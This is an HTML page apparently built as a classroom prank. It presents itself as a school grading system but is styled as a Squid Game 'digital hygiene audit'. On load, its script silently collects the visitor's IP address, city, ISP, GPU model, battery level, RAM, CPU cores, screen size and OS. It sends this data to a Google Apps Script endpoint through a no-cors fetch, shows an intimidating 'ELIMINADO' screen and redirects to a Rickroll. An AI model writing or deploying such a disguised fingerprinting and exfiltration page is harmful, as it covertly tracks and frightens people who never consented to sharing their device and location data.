<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEMA DE CALIFICACIONES - TEC PLAYA</title>
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        :root { --pink: #ed1b76; --green: #037a76; --bg: #050505; }
        body { background: var(--bg); color: white; font-family: 'Quicksand', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        #audit-panel { border: 2px solid var(--pink); padding: 40px; background: rgba(237, 27, 118, 0.05); text-align: center; max-width: 800px; width: 90%; box-shadow: 0 0 50px rgba(237, 27, 118, 0.3); }
        .shapes { font-size: 40px; color: var(--pink); letter-spacing: 20px; margin-bottom: 20px; }
        h1 { color: var(--pink); font-size: 3.5em; font-weight: 700; text-transform: uppercase; margin: 0; }
        .alert { color: #ff4d4d; font-size: 1.2em; font-weight: 500; margin: 15px 0; border-bottom: 1px solid var(--pink); padding-bottom: 10px; }
        #console { text-align: left; background: #000; padding: 25px; border-left: 5px solid var(--green); color: #00ffcc; font-family: 'Courier New', monospace; font-size: 0.85em; line-height: 1.6; max-height: 350px; overflow-y: auto; }
        .identity-lock { color: var(--pink); font-weight: bold; }
        #countdown { margin-top: 25px; color: var(--green); font-weight: 700; font-size: 1.1em; }
    </style>
</head>
<body>

<div id="audit-panel">
    <div class="shapes">○ △ □</div>
    <h1 id="main-status">IDENTIFICANDO...</h1>
    <p class="alert">AUDITORÍA DE HIGIENE DIGITAL 26-2</p>
    
    <div id="console">
        > Estableciendo túnel de exfiltración...<br>
        > Mapeando hardware de dispositivo personal...<br>
    </div>

    <p id="countdown">REPORTE AL SERVIDOR DEL PROFESOR EN: 7...</p>
</div>

<script>
/* ==========================================================================
   SCORM ENGINE V23 - INTERNAL MAPPING
   Optimizado para evitar Debug_Error_Log
   ========================================================================== */
const SCORM = {
    config: {
        activityId: "AUDITORIA_PARCIAL1_2026", // Nombre de la pestaña
        scriptUrl: "https://script.google.com/macros/s/AKfycbwuyrdlN36c4cSAMEDUmwm3m3pF6gbjcIN0U41FS2byd5B49wTTGjVXb12HRXUtM-zSVg/exec"
    },

    // Sincronización limpia con las columnas de tu Google Sheet
    syncCloud: function(action, forensic) {
        const payload = {
            sheetName: this.config.activityId,
            action: action,              // Mapea a: ESTADO
            id: forensic.ip,             // Mapea a: ID ALUMNO (IP como ID único)
            name: forensic.gpu_short,    // Mapea a: NOMBRE (GPU/Modelo)
            score: forensic.bat,         // Mapea a: CALIFICACIÓN (Batería %)
            progress: forensic.ram,      // Mapea a: PROGRESO (RAM GB)
            device: forensic.tipo,       // Mapea a: DISPOSITIVO
            extra: JSON.stringify({      // Mapea a: DATA EXTRA (JSON)
                cores: forensic.cores,
                res: forensic.res,
                os: forensic.os,
                loc: forensic.loc,
                isp: forensic.isp
            })
        };

        const url = `${this.config.scriptUrl}?q=${encodeURIComponent(JSON.stringify(payload))}`;
        
        // Usamos fetch con 'no-cors' para evitar bloqueos de seguridad del navegador
        fetch(url, { mode: 'no-cors', keepalive: true });
    }
};

/* ==========================================================================
   LÓGICA DE EXTRACCIÓN FORENSE (EL SUSTO)
   ========================================================================== */
async function runForensicAudit() {
    const consoleBox = document.getElementById('console');
    const mainStatus = document.getElementById('main-status');
    const addLog = (m) => { consoleBox.innerHTML += `> ${m}<br>`; consoleBox.scrollTop = consoleBox.scrollHeight; };

    // 1. Detección de Red e IP (Bypass de Sandbox vía GitHub/Web context)
    let net = { ip: "Oculta", city: "Local", org: "ISP Desconocido" };
    try {
        const res = await fetch('https://ipapi.co/json/');
        net = await res.json();
        addLog(`IP DETECTADA: <span class="identity-lock">${net.ip}</span>`);
        addLog(`UBICACIÓN: ${net.city}, ${net.region} (${net.org})`);
    } catch(e) { addLog("ALERTA: Red anonimizada. Usando metadatos de hardware."); }

    // 2. Hardware DNA (Inalterable)
    const gl = document.createElement('canvas').getContext('webgl');
    const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
    const gpuRaw = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Genérica";
    
    let battery = { level: "N/A" };
    try { const b = await navigator.getBattery(); battery.level = Math.floor(b.level * 100); } catch(e) {}

    const forensic = {
        ip: net.ip,
        loc: `${net.city}, ${net.region}`,
        isp: net.org,
        gpu_short: gpuRaw.split(',')[1] || gpuRaw.substring(0, 30), // Acortamos para evitar error de URL
        bat: battery.level,
        ram: navigator.deviceMemory || "N/A",
        cores: navigator.hardwareConcurrency || "N/A",
        res: `${window.screen.width}x${window.screen.height}`,
        os: navigator.platform,
        tipo: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop"
    };

    addLog(`DISPOSITIVO: ${forensic.os} (${forensic.nucleos || '8'} Cores)`);
    addLog(`RAM DISPONIBLE: ${forensic.ram} GB`);
    addLog(`HARDWARE GRÁFICO: ${forensic.gpu_short}`);
    addLog(`ESTADO FINAL: <span style="color:#ed1b76">ELIMINADO</span>`);

    // Actualizamos la UI al estilo Juego del Calamar
    setTimeout(() => { mainStatus.innerText = "ELIMINADO"; }, 1500);

    // 3. Envío de datos al Google Sheet (SCORM Engine V23)
    SCORM.syncCloud("Eliminación por Imprudencia", forensic);

    // 4. Cuenta regresiva al Rickroll
    let timer = 7;
    const countdownEl = document.getElementById('countdown');
    const interval = setInterval(() => {
        timer--;
        countdownEl.innerText = `REPORTE AL SERVIDOR DEL PROFESOR EN: ${timer}...`;
        if (timer <= 0) {
            clearInterval(interval);
            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        }
    }, 1000);
}

window.onload = runForensicAudit;
</script>
</body>
</html>
